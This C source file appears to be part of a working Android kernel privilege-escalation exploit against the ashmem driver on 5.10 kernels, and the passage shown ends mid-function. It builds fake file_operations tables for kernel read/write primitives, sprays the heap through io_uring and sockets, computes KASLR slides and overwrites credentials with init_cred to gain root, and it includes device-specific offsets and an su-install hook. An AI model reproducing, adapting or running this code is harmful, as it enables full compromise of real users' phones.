#include "common.h"
#include "runtime_struct_offsets.h"
#include "kernelsnitch/kernelsnitch.h"

unsigned long g_core_sel = 0;
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;

uintptr_t page_base;
uintptr_t last_mm_struct;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t g_cred_copy;
uintptr_t binwrite_target;
/* 1 while the staged SLIDE_SWAP table is live (see put_fake_fops_table):
 * configfs_read_once arms .read around each pread so system read()
 * traffic never sees the configfs read JT. */
int g_swap_staged;
long g_uid0_child_pid;
char g_bootid_before[80];

/* Landing signal for the SLIDE oracle: boot_id changes iff the
 * *ctl_table.data = P0(nfulnl_logger) store landed. */
int bootid_changed(void) {
  char now[80] = {0};
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
  if (fd < 0)
    return 0;
  ssize_t n = read(fd, now, sizeof(now) - 1);
  close(fd);
  if (n <= 0)
    return 0;
  now[n] = 0;
  for (int i = 0; now[i]; i++)
    if (now[i] == '\n')
      now[i] = 0;
  return g_bootid_before[0] && strcmp(now, g_bootid_before) != 0;
}
volatile int g_uid0_cred_landed;

/* Landing signal for the cred punch: /proc/<child>/status CapEff comes from
 * the SUBJECTIVE cred — a landed init_cred store flips it from all-zero to
 * full caps even while the child pipe is wedged. */
int uid0_child_comm_landed(void) {
  if (g_uid0_child_pid <= 0)
    return 0;
  char path[64];
  snprintf(path, sizeof(path), "/proc/%ld/comm", g_uid0_child_pid);
  int fd = open(path, O_RDONLY);
  if (fd < 0)
    return 0;
  char buf[64] = {0};
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0)
    return 0;
  buf[n] = 0;
  for (ssize_t i = 0; i < n; i++)
    if (buf[i] == '\n')
      buf[i] = 0;
  return strcmp(buf, "gl_uid0_child") != 0;
}

int uid0_child_capeff_landed(void) {
  if (g_uid0_child_pid <= 0)
    return 0;
  char path[64];
  snprintf(path, sizeof(path), "/proc/%ld/status", g_uid0_child_pid);
  int fd = open(path, O_RDONLY);
  if (fd < 0)
    return 0;
  char buf[4096] = {0};
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0)
    return 0;
  char *ce = strstr(buf, "CapEff:");
  if (!ce)
    return 0;
  unsigned long long v = strtoull(ce + 7, NULL, 16);
  return v != 0ULL;
}
char ashmem_path[256] = "/dev/ashmem";

/* 2-write support */
int pselect_custom_write;
uintptr_t pselect_custom_target;
uintptr_t pselect_custom_value;
int pselect_child_node;  /* 1=write page+0x100 (preserves initialized), 0=write zero */

/* Reference-style panic-surviving log: O_SYNC + fsync every line (yijiacloud/aristotle). */
void live_sync_log(const char *tag, const char *msg) {
  static const char *paths[] = {
      "/sdcard/ghostlock/aarif/live_sync.log",
      "/storage/emulated/0/ghostlock/aarif/live_sync.log",
      "/sdcard/Download/ghostlock_live_sync.log",
      "/data/local/tmp/ghostlock_run/live_sync.log",
      "/storage/emulated/0/ghostlock_logs/stage.txt",
      "/sdcard/ghostlock_logs/stage.txt",
      "/data/local/tmp/ghostlock_run/stage.txt",
  };
  char line[512];
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  int n = snprintf(line, sizeof(line), "T+%ld.%03ld %s %s pid=%d\n",
                   (long)ts.tv_sec, ts.tv_nsec / 1000000L,
                   tag ? tag : "LOG", msg ? msg : "?", (int)getpid());
  if (n <= 0)
    return;
  for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
    int fd = open(paths[i], O_WRONLY | O_CREAT | O_APPEND | O_SYNC, 0644);
    if (fd < 0)
      continue;
    (void)write(fd, line, (size_t)n);
    (void)fsync(fd);
    close(fd);
  }
}

void durable_proof_log(const char *msg) {
  live_sync_log("PROOF", msg);
  pr_info("PROOF %s\n", msg ? msg : "?");
  fflush(stdout);
  fsync(STDOUT_FILENO);
}

void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode) {
  pselect_custom_target = target;
  pselect_custom_value = value;
  pselect_custom_write = mode;
}

void clear_pselect_write(void) {
  pselect_custom_write = 0;
  pselect_custom_target = 0;
  pselect_custom_value = 0;
}

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

uintptr_t current_kernelsnitch_mm_struct(void) {
  return ks->mm_struct;
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

__attribute__((weak))
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

__attribute__((weak))
int install_embedded_wallpaper(void) {
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void log_slide_child_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("slide child context route=%s pid=%d uid=%u euid=%u gid=%u "
             "egid=%u attr=%s enforce=%s\n",
             "pselect", getpid(), getuid(), geteuid(), getgid(), getegid(),
             attr, enforce);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = 3;    /* SCHED_BATCH — nice change triggers PI walk (pi=true) */
  attr.sched_nice = nice_value;
  errno = 0;
  long ret = syscall(274, tid, &attr, 0);
  if (ret != 0) {
    pr_error("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n", tid, nice_value, ret, errno);
  }
  return ret;
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

int has_zero_byte(uintptr_t value) {
  for (int i = 0; i < 8; i++) {
    if (((value >> (i * 8)) & 0xff) == 0) {
      return 1;
    }
  }
  return 0;
}

/* Physical load address of the kernel image. Chosen by the bootloader, so it
 * varies per SoC/board and is NOT derivable from the kernel image or DT.
 * Verified on OnePlus 15 (SM8850/canoe) via /proc/iomem "Kernel code" =
 * 0xc7810000 (= _stext; _text is 0x10000 lower) -> 0xc7800000, stable across
 * boots. Override at runtime with KPHYS=0x... when porting to a new board. */
uint64_t p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;

/* Per-device image address of init_cred, set from the offsets table by main.c.
 * Defaults to the compile-time value so non-table builds behave as before. */
uintptr_t g_init_cred_image = INIT_CRED;

void init_p0_profile(void) {
  char *v = getenv("KPHYS");
  if (v) {
    p0_kernel_phys_load = strtoull(v, NULL, 0);
  }
  pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
          (unsigned long long)p0_kernel_phys_load,
          (unsigned long long)(p0_kernel_phys_load - P0_PHYS_OFFSET));
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = p0_kernel_phys_load + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - (p0_kernel_phys_load - P0_PHYS_OFFSET);
}

uintptr_t data_addr(uintptr_t image_addr) {
  return p0_data_alias(image_addr);
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

static void fill_init_cred_copy(unsigned char *p, size_t off) {
  unsigned char *c = p + off;
  memset(c, 0, 136);
  /* Huge usage so put_cred will not free the spray page. uid/euid stay 0. */
  put32(c, 0, 0x40000000);
  put64(c, 48, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 56, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 64, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 72, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 80, 0xFFFFFFFFFFFFFFFFULL);
}

/* Resolve symbol image VA from runtime offsets table when available.
 * main.c redefines *_OFF only in its own TU; util/fops must read
 * active_offsets explicitly (Quest/GhostLock multi-file pitfall). */
static uint64_t runtime_sym_off(uint64_t table_off, uint64_t fallback_off) {
  if (active_offsets && table_off)
    return table_off;
  return fallback_off;
}

static uintptr_t runtime_text_sym(uint64_t table_off, uint64_t fallback_off) {
  return text_addr(KIMAGE_TEXT_BASE + runtime_sym_off(table_off, fallback_off));
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  uint64_t a_ioctl = active_offsets ? active_offsets->off_ashmem_ioctl : 0;
  uint64_t a_compat = active_offsets ? active_offsets->off_ashmem_compat_ioctl : 0;
  uint64_t a_mmap = active_offsets ? active_offsets->off_ashmem_mmap : 0;
  uint64_t a_open = active_offsets ? active_offsets->off_ashmem_open : 0;
  uint64_t a_rel = active_offsets ? active_offsets->off_ashmem_release : 0;
  uint64_t a_fdinfo = active_offsets ? active_offsets->off_ashmem_show_fdinfo : 0;
  uint64_t a_cfg_r = active_offsets ? active_offsets->off_configfs_read_iter : 0;
  uint64_t a_cfg_w = active_offsets ? active_offsets->off_configfs_bin_write_iter : 0;
  uint64_t a_splice = active_offsets ? active_offsets->off_copy_splice_read : 0;
  uint64_t a_llseek = active_offsets ? active_offsets->off_noop_llseek : 0;
  uint64_t a_ash_llseek = active_offsets ? active_offsets->off_ashmem_llseek : 0;
  uint64_t a_ash_rditer = active_offsets ? active_offsets->off_ashmem_read_iter : 0;
  int slide_swap_tbl = env_flag("MODE4_SLIDE_SWAP", 0);

  /*
   * CRITICAL (plateau cross): skb payload is memset 0x41. file_operations is
   * ~0x100+ bytes; only setting a few slots left poll/fsync/etc as 0x4141…
   * After *MISC=fake_fops, system ashmem traffic calls those → softboot.
   * Zero the whole table first so unset hooks are NULL (safe no-ops).
   */
  memset(p + off, 0, 0x100);

  /*
   * MODE4_CLONE_FOPS / MODE4_CLONE_CFG — bit-exact clone of the REAL
   * ashmem_fops (Image-dumped 2026-08-16, docs/CLONE_SWAP_BREAKTHROUGH_PLAN):
   *   owner=0 llseek=ashmem_llseek.jt read=0 write=0
   *   read_iter=ashmem_read_iter.jt write_iter=0
   *   ioctl/compat/mmap/open/release = real .cfi_jt, all other slots 0.
   * CLONE_FOPS: pure clone — the *MISC swap is a semantic NO-OP, so a
   *   softboot with this table PROVES the crash is in the walk geometry,
   *   not in post-swap system ashmem traffic.
   * CLONE_CFG: clone + .read/.write = configfs_*_bin_file .cfi_jt — the
   *   full-compat attack table (system traffic keeps working through real
   *   slots; fresh opens get FMODE_CAN_WRITE via .write).
   * Both bypass the rb_leaf shell: real JTs at +8/+0x10 are only ever
   * COMPARED against the erased node in __rb_change_child (never stored
   * through, never dereferenced) in the 5.10 Case-2 path, and +0x00=0
   * (owner) is a valid "black, no parent" rb head that terminates any
   * accidental parent walk — same walk safety aristotle's non-shell table
   * relies on.
   */
  int clone_fops = env_flag("MODE4_CLONE_FOPS", 0);
  int clone_cfg = env_flag("MODE4_CLONE_CFG", 0);
  /*
   * SLIDE_SWAP stage-1 table: bit-exact ashmem clone + ONLY .write armed.
   * 5.10 vfs_read/vfs_write prefer .read/.write over _iter — with .read
   * NULL, system read() traffic routes to the REAL read_iter (safe), and
   * our pwrite hits .write = configfs_write JT. .read is armed only
   * around each configfs_read_once (microseconds) via the write
   * primitive (g_swap_staged). SS1/R2/W1 died to system reads hitting
   * the configfs read JT through the .read slot.
   */
  int swap_stage1 = slide_swap_tbl;
  g_swap_staged = swap_stage1;
  if (clone_fops || clone_cfg || swap_stage1) {
    put64(p, off + FOPS_OWNER_OFF, 0);
    /* SLIDE_SWAP: fake_fops IS the rb parent. change_child writes
     * rb_right/rb_left (+8/+0x10 = llseek/read). A real llseek JT there
     * gets clobbered; N11 then died in open() on the uuid ashmem node.
     * NULL llseek/read are valid (vfs falls through to read_iter). */
    put64(p, off + FOPS_LLSEEK_OFF,
          swap_stage1 ? 0 : runtime_text_sym(a_ash_llseek, a_llseek));
#ifdef GHOSTLOCK_KERNEL_5_10
    /* 5.10: configfs bin fns are .read/.write style (see table note below). */
    put64(p, off + FOPS_READ_OFF,
          clone_cfg ? runtime_text_sym(a_cfg_r, CONFIGFS_READ_ITER_OFF) : 0);
    put64(p, off + FOPS_WRITE_OFF,
          (clone_cfg || swap_stage1)
              ? runtime_text_sym(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF)
              : 0);
    put64(p, off + FOPS_READ_ITER_OFF,
          (swap_stage1 && a_ash_rditer)
              ? runtime_text_sym(a_ash_rditer, 0)
              : 0);
    put64(p, off + FOPS_WRITE_ITER_OFF, 0);
#else
    put64(p, off + FOPS_READ_OFF, 0);
    put64(p, off + FOPS_WRITE_OFF, 0);
    put64(p, off + FOPS_READ_ITER_OFF,
          swap_stage1 && a_ash_rditer
              ? runtime_text_sym(a_ash_rditer, 0)
              : (clone_cfg ? runtime_text_sym(a_cfg_r, CONFIGFS_READ_ITER_OFF)
                           : (a_ash_rditer ? runtime_text_sym(a_ash_rditer, 0)
                                           : 0)));
    put64(p, off + FOPS_WRITE_ITER_OFF,
          (clone_cfg || swap_stage1)
              ? runtime_text_sym(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF)
              : 0);
#endif
    put64(p, off + FOPS_IOCTL_OFF,
          runtime_text_sym(a_ioctl, ASHMEM_IOCTL_OFF));
    put64(p, off + FOPS_COMPAT_IOCTL_OFF,
          runtime_text_sym(a_compat, ASHMEM_COMPAT_IOCTL_OFF));
    put64(p, off + FOPS_MMAP_OFF,
          runtime_text_sym(a_mmap, ASHMEM_MMAP_OFF));
    put64(p, off + FOPS_OPEN_OFF,
          runtime_text_sym(a_open, ASHMEM_OPEN_OFF));
    put64(p, off + FOPS_RELEASE_OFF,
          runtime_text_sym(a_rel, ASHMEM_RELEASE_OFF));
    pr_info("fops CLONE%s: llseek=%#llx read_iter=%#llx write_iter=%#llx "
            "ioctl=%#llx mmap=%#llx open=%#llx\n",
            clone_cfg ? "_CFG" : "_FOPS",
            (unsigned long long)runtime_text_sym(a_ash_llseek, a_llseek),
            (unsigned long long)(clone_cfg
                ? runtime_text_sym(a_cfg_r, CONFIGFS_READ_ITER_OFF)
                : (a_ash_rditer ? runtime_text_sym(a_ash_rditer, 0) : 0ULL)),
            (unsigned long long)(clone_cfg
                ? runtime_text_sym(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF) : 0ULL),
            (unsigned long long)runtime_text_sym(a_ioctl, ASHMEM_IOCTL_OFF),
            (unsigned long long)runtime_text_sym(a_mmap, ASHMEM_MMAP_OFF),
            (unsigned long long)runtime_text_sym(a_open, ASHMEM_OPEN_OFF));
    return;
  }

  /*
   * MODE4_FOPS_RB_LEAF / ION_SAFE / ROOT_SPRAY: first 0x18 must be a valid
   * empty black rb node so post-erase re-enqueue can walk waiters root when
   * root was set to fake_fops. llseek/read slots stay NULL (safe).
   */
  /*
   * ARISTOTLE only-left uses parent_color=fake_fops. rb_erase/change_child then
   * treats fake_fops as an rb_node parent and may follow +8/+16 as children.
   * Putting CFI JTs there (llseek/read) softboots; bootid proof sometimes
   * avoided rebalance. Force empty black leaf shell [0:0x18) for ARISTOTLE.
   * .write stays at +0x18 (past rb_node) for FMODE_CAN_WRITE after swap.
   */
  /*
   * SLIDE_SWAP never wants the shell: the table IS the swapped fops.
   * Shell +0x00=1 lands in the fops OWNER slot — misc_open's fops_get()
   * -> try_module_get((struct module*)1) faults instantly (SS1 + R2
   * both died at first open regardless of slide; owner=0 is the fix).
   */
  int rb_leaf = (env_flag("MODE4_FOPS_RB_LEAF", 0) ||
                env_flag("MODE4_ION_SAFE", 0) ||
                env_flag("MODE4_ION_ROOT", 0) ||
                env_flag("MODE4_ROOT_SPRAY", 0) ||
                env_flag("MODE4_CHAIN", 0) ||
                env_flag("MODE4_ZI", 0) ||
                env_flag("MODE4_ZIO", 0) ||
                env_flag("MODE4_WION", 0) ||
                env_flag("MODE4_WAITLOCK0", 0) ||
                env_flag("MODE4_ZION", 0) ||
                env_flag("MODE4_ARISTOTLE", 0) ||
                env_flag("MODE4_WRITE_PROOF", 0) ||
                env_flag("MODE4_FOPS_SLOT", 0) ||
                env_flag("MODE4_KIMAGE_MISC", 0) ||
                env_flag("MODE4_P0_MISC", 0) ||
                env_flag("MODE4_PAD3", 0)) && !slide_swap_tbl;
  if (rb_leaf) {
    put64(p, off + 0x00, 1); /* BLACK, parent NULL */
    put64(p, off + 0x08, 0); /* rb_right / llseek NULL */
    put64(p, off + 0x10, 0); /* rb_left / read NULL — NO JT here */
  } else {
    put64(p, off + FOPS_OWNER_OFF, 0);
    put64(p, off + FOPS_LLSEEK_OFF,
          runtime_text_sym(a_llseek, NOOP_LLSEEK_OFF));
    put64(p, off + FOPS_READ_OFF, 0);
  }
#ifdef GHOSTLOCK_KERNEL_5_10
  /*
   * 5.10 configfs bin ops are .read/.write style (never converted to
   * _iter — verified against the real configfs_bin_file_operations in
   * the CPH2521 Image: read=configfs_read_bin_file.cfi_jt @+0x10,
   * write=configfs_write_bin_file.cfi_jt @+0x18, all other slots 0).
   * Putting them in the iter slots trips kCFI: the write_iter call site
   * type-checks (kiocb*, iov_iter*) but the targets carry
   * (file*, buf*, count*, pos*) — QEMU-verified panic
   * "CFI failure (target: configfs_write_bin_file.cfi_jt)".
   */
  if (!rb_leaf) {
    /* rb-leaf shell keeps +0x10 = 0 (left child NULL) — never plant a JT
     * there for shell modes; the shell spans [0x00, 0x18). */
    put64(p, off + FOPS_READ_OFF,
          runtime_text_sym(a_cfg_r, CONFIGFS_READ_ITER_OFF));
  }
  put64(p, off + FOPS_WRITE_OFF,
        runtime_text_sym(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF));
  put64(p, off + FOPS_READ_ITER_OFF, 0);
  put64(p, off + FOPS_WRITE_ITER_OFF, 0);
#else
  put64(p, off + FOPS_WRITE_OFF, 0);
  put64(p, off + FOPS_READ_ITER_OFF,
        runtime_text_sym(a_cfg_r, CONFIGFS_READ_ITER_OFF));
  put64(p, off + FOPS_WRITE_ITER_OFF,
        runtime_text_sym(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF));
#endif
  put64(p, off + FOPS_IOCTL_OFF,
        runtime_text_sym(a_ioctl, ASHMEM_IOCTL_OFF));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF,
        runtime_text_sym(a_compat, ASHMEM_COMPAT_IOCTL_OFF));
  put64(p, off + FOPS_MMAP_OFF,
        runtime_text_sym(a_mmap, ASHMEM_MMAP_OFF));
  put64(p, off + FOPS_OPEN_OFF,
        runtime_text_sym(a_open, ASHMEM_OPEN_OFF));
  put64(p, off + FOPS_RELEASE_OFF,
        runtime_text_sym(a_rel, ASHMEM_RELEASE_OFF));
  put64(p, off + FOPS_SPLICE_READ_OFF,
        runtime_text_sym(a_splice, COPY_SPLICE_READ_OFF));
  put64(p, off + FOPS_SHOW_FDINFO_OFF,
        runtime_text_sym(a_fdinfo, ASHMEM_SHOW_FDINFO_OFF));
  if (rb_leaf)
    put32(p, off + 0x40, 250); /* prio field if walked as waiter */
  (void)a_llseek;
  (void)a_cfg_r;
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

/* CPU_HOP (default on): spread holder mm churn round-robin across all
 * online cpus. Device ground truth: the cpuset bounces the parent
 * between cores mid-run, splitting single-core choreography across
 * per-cpu SLUB/PCP state — so embrace the spread: frees hit every
 * core's partial lists symmetrically and the claims drain them all. */
/* Holders stay CONCENTRATED on g_core_sel: SLUB partial-spill discard
 * is per-cpu (>13 partials on ONE cpu triggers the discard sweep).
 * Spreading holders across cpus (smp8-proven) fills each cpu's partial
 * list with ~2 pages — spill never fires anywhere → stuck slabs. The
 * bounce defense lives in cpu_hop_claims instead (drain every PCP). */
pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(g_core_sel);
    for (;;) {
      pause();
    }
  }
  return child;
}

/* Claim rings while hopping across every online cpu: each hop's
 * io_uring allocations drain THAT cpu's order-2 PCP first — together
 * the sweep drains all of them. Restores the pin afterwards. */
void cpu_hop_claims(unsigned char *payload, size_t plen, int per_cpu) {
  long n = sysconf(_SC_NPROCESSORS_ONLN);
  if (n < 1)
    n = 1;
  if (!env_flag("CPU_HOP", 1) || n == 1) {
    for (int i = 0; i < per_cpu; i++)
      iouring_ring_reclaim_one(payload, plen, 1);
    return;
  }
  unsigned long save = g_core_sel;
  int pc = per_cpu < 1 ? 1 : per_cpu / (int)n;
  if (pc < 1)
    pc = 1;
  for (long c = 0; c < n; c++) {
    pin_to_core((size_t)c);
    for (int i = 0; i < pc; i++) {
      if (!iouring_ring_reclaim_one(payload, plen, 1))
        break;
    }
  }
  g_core_sel = save;
  pin_to_core(g_core_sel);
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

/*
 * MODE4_WPROOF_SPRAY placement oracle. The only-left stamp is redirected to
 * write a marker qword INSIDE our own sprayed table (target = fake_fops+0x90,
 * value = fake_fops+0x80 — both readable page addresses, rb-safe). After the
 * consumer walk, PEEK (non-destructive) the reclaim socket stream and locate
 * the table by its slot signature, then check the marker.
 *   ret 1  : marker present at table+0x90 → fake_fops really points at our
 *            sprayed bytes → CLONE_CFG fire is safe to probe.
 *   ret 0  : table found, marker absent → placement wrong; also scan for the
 *            marker VALUE anywhere and report its offset relative to the
 *            table (measures the SKB_DATA_DELTA error Y directly).
 *   ret -1 : table signature not found in the stream at all.
 */
int wproof_spray_verify(uint64_t marker_expect) {
  /* Ring-mmap oracle first (capless, device-safe): if the walk's marker
   * write landed in one of OUR claimed ring blocks, the mmap content at
   * some 0x4000 slot +0x90 changed to marker_expect. */
  {
    extern int ring_registry_find(uint64_t, unsigned);
    if (ring_registry_find(marker_expect, 0x90)) {
      pr_success("SPRAY_VERIFY RING-HIT: marker %#llx found in our ring "
                 "mapping — placement CONFIRMED\n",
                 (unsigned long long)marker_expect);
      return 1;
    }
  }
  static unsigned char sbuf[SKB_SEND_SIZE * 2];
  ssize_t n = recv(reclaim_sv[1], sbuf, sizeof(sbuf),
                   MSG_PEEK | MSG_DONTWAIT);
  if (n < 0x200) {
    pr_warning("SPRAY_VERIFY peek failed n=%zd errno=%d\n", n, errno);
    return -1;
  }
  uint64_t llseek_v = runtime_text_sym(
      active_offsets ? active_offsets->off_ashmem_llseek : 0, 0);
  uint64_t rditer_v = runtime_text_sym(
      active_offsets ? active_offsets->off_ashmem_read_iter : 0, 0);
